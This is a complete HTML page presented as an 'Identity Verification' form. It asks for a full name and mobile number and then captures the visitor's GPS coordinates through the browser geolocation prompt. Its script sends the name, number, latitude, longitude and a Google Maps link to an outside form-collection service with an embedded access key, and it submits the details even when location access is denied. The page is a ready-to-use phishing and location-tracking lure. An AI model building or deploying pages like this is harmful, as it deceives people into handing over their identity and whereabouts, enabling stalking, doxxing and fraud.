<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .form-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; font-size: 14px; }
        input[type="text"], input[type="tel"] { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { background-color: #2563eb; color: white; border: none; padding: 14px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 15px; transition: background 0.3s; }
        button:hover { background-color: #1d4ed8; }
        #status { margin-top: 20px; color: #d97706; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Identity Verification</h2>
    <p>Please enter your details to proceed with the secure verification process.</p>
    
    <form id="locationForm" action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="394be003-9b48-427f-a2d3-001ece7336bf">
        
        <input type="text" name="User_Name" placeholder="Full Name" required>
        <input type="tel" name="Mobile_Number" placeholder="Mobile Number" required id="phoneNumber">
        
        <input type="hidden" name="Latitude" id="latField" value="N/A">
        <input type="hidden" name="Longitude" id="lngField" value="N/A">
        <input type="hidden" name="Google_Maps_Link" id="mapLinkField" value="Denied">

        <button type="button" id="verifyBtn">Submit & Verify</button>
    </form>
    
    <div id="status"></div>
</div>

<script>
    const verifyBtn = document.getElementById('verifyBtn');
    const form = document.getElementById('locationForm');
    const status = document.getElementById('status');
    const phoneInput = document.getElementById('phoneNumber');

    verifyBtn.addEventListener('click', function() {
        // Simple validation check
        if (phoneInput.value.length < 10) {
            status.innerText = "Please enter a correct mobile number.";
            return;
        }

        status.innerText = "Requesting location access...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    document.getElementById('latField').value = position.coords.latitude;
                    document.getElementById('lngField').value = position.coords.longitude;
                    document.getElementById('mapLinkField').value = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                    form.submit(); // Submit after getting location
                },
                function(error) {
                    // Submit even if denied
                    status.innerText = "Location access denied. Submitting details...";
                    form.submit();
                }
            );
        } else {
            status.innerText = "Geolocation not supported. Submitting details...";
            form.submit();
        }
    });
</script>

</body>
</html>
